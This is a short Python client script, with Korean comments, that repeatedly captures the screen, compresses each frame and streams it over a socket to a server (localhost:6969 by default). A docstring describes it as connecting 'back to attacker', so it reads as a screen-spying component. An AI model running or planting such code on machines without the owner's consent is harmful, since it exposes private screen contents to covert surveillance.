# 서버에게 클라이언트의 스크린을 공유
# 클라이언트 : 본인의 스크린을 받아와 서버로 보낸다.

import socket
from zlib import compress

from mss import mss


WIDTH = 1900
HEIGHT = 1000

def retreive_screenshot(conn):
    with mss() as sct:
        # The region to capture
        rect = {'top': 0, 'left': 0, 'width': WIDTH, 'height': HEIGHT}

        while True:
            # Capture the screen
            img = sct.grab(rect)
            # Tweak the compression level here (0-9)
            pixels = compress(img.rgb, 6)

            # Send the size of the pixels length
            size = len(pixels)
            size_len = (size.bit_length() + 7) // 8
            conn.send(bytes([size_len]))

            # Send the actual pixels length
            size_bytes = size.to_bytes(size_len, 'big')
            conn.send(size_bytes)

            # Send pixels
            conn.sendall(pixels)

def main(host='127.0.0.1', port=6969):
    ''' connect back to attacker on port'''
    sock = socket.socket()
    sock.connect((host, port))
    try:
        while True:
            retreive_screenshot(sock)

    except Exception as e:
        print("ERR: ", e)
        sock.close()

if __name__ == '__main__':
    main()